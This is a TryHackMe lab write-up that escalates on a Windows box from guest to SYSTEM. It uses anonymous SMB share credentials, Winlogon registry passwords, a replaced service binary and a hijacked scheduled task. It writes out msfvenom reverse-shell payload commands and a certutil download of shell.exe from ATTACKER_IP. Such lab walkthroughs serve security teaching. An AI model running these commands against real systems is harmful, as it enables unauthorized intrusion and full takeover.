
Writeup for TryHackMe CTF from Jr Penetration Tester path.
Room description:
*A routine vulnerability scan flagged a Windows machine on the internal network; nothing alarming on the surface, just a standard workstation left behind after a round of layoffs. IT never cleaned it up properly. Your job is to find out how badly. Your objective is to escalate from guest access all the way through:  

`guest`->`thmuser`->`notadmin`->`svcadmin`->`SYSTEM`*

I started as always with nmap scan: `nmap -A -T4 -p- -v MACHINE_IP`
The results:
```
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: PRIVESC
|   NetBIOS_Domain_Name: PRIVESC
|   NetBIOS_Computer_Name: PRIVESC
|   DNS_Domain_Name: privesc
|   DNS_Computer_Name: privesc
|   Product_Version: 10.0.17763
|_  System_Time: 2026-09-05T12:43:18+00:00
|_ssl-date: 2026-09-05T12:43:27+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=privesc
| Issuer: commonName=privesc
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-10T06:39:22
| Not valid after:  2026-11-09T06:39:22
| MD5:   cab5:2ba5:110d:a22e:8776:fc49:279e:22b4
|_SHA-1: d83b:a5cf:3b55:b9e8:4d07:0970:7465:79d6:6536:e680
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
```

I'll start with listing smb shares, because port 445 is open.
The command: `smbclient -L //Machine_IP -N`
This command listed all available shares on smb:
```
Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Public          Disk      Public file share
```

Now, I'll connect to the specific shares, and I'll start with `Public`. 
`smbclient //Machine_IP/Public -N`

I found a file `welcome.txt` in `Public` share, and downloaded it with `get welcome.txt`. In the file I found default credentials:
```
Welcome to CORP-NET.

New employee default credentials
================================
Username : thmuser
Password : Password1!

Please change your password after first login.
```

Now, I can log in as a `guest` user into the machine.
I used *xfreerdp* to do that.
`xfreerdp /v:Machine_IP /u:thmuser /p:'Password1!' /cert:ignore +clipboard /dynamic-resolution /drive:share,/share`

I also created a share directory, both on my attack box and with command above on the windows machine - `/drive:share,/share`.
After establishing a connection to the machine via `xfreerdp` I opened PowerShell terminal and I went straight to reading the first flag with `type C:\Users\thmuser\Desktop\flag1.txt`
**THM{5mb_cr3d5_1n_th3_5h4r3}**

Now it's time to privilege escalation and gaining access to a `notadmin` user.
First thing I tried to check out if there are any saved credentials in the HKLM registry.
`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`
And there were saved credentials for a `notadmin` user:
```
DefaultUserName    REG_SZ    notadmin
DefaultPassword    REG_SZ    P@ssw0rd!
```

Now I'll switch session with `runas /user:privesc\notadmin cmd.exe`.
And I landed in the cmd on `notadmin` user, and I straight went to reading a flag: `type C:\Users\notadmin\Desktop\flag2.txt`
**THM{w1nl0g0n_cr3ds_3xp0s3d}**

Now I need to jump from `notadmin` to `svcadmin`, and to do that I checked services run as a `svcadmin` user with: `wmic service get name,pathname,startname | findstr /i "svcadmin"`
There was one service:
```
 C:\Windows\THMSVC\svc.exe
```

To make next jump to the `svcadmin` I'll create my own service with `msfvenom` with a reverse shell, and overwrite existing service with malicious one.
The syntax for `msfvenom`:
`msfvenom -p windows/x64/shell_reverse_tcp LHOST ATTACKER_IP LPORT=ATTACKER_PORT -f exe-service -o svc.exe`

I started a listener, and uploaded malicious service to the windows host with help of earlier created `share` directory. I put malicious `svc.exe` there on my attack box. You can check shares on Windows host with command: `net use`.
To upload malicious service into Windows host use:
`copy \\TSCLIENT\_share\svc.exe C:\Windows\THMSVC\svc.exe`
Now I need to start it - `sc start THMSvc`
And with that I got a connection on my listener to a `svcadmin` user.
To read the third flag: `type C:\Users\svcadmin\Desktop\flag3.txt`
And the third flag is **THM{s3rv1c3_b1n4ry_h1j4ck3d}**

Now it's time to gain `SYSTEM` user.
To do that first check the tasks, in `C:\Windows\Tasks` there is a file `cleanup.bat`.
First check if can it be modified with: `icacls cleanup.bat`, after running this command I can see that in fact the file can be modified:
```
icacls cleanup.bat
cleanup.bat BUILTIN\Users:(I)(RX)
            PRIVESC\svcadmin:(I)(M)
            BUILTIN\Administrators:(I)(F)
            NT AUTHORITY\SYSTEM:(I)(F)
```

The `(M)` next to `svcadmin` tells it.
Now I need to create another malicious `.exe` file with `msfvenom`.
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=ATTACKER_PORT -f exe -o shell.exe`

After doing it, I created a python http server, and used `certutil` command on Windows host to download malicious file.
`certutil -urlcache -split -f http://ATTACKER_IP:80/shell.exe C:\Windows\Tasks\shell.exe`

To edit `cleaup.bat` file and add the contents of `shell.exe` into it, I used: `cmd /c "echo C:\Windows\Tasks\shell.exe > C:\Windows\Tasks\cleanup.bat"`
After doing that the `cleanup.bat` file with relate to the `shell.exe` when opened.

After a few moments I get another shell as a `SYSTEM`, and I read the flag in `C:\`.
**THM{t4sk_wr1t3_t0_SYST3M}**
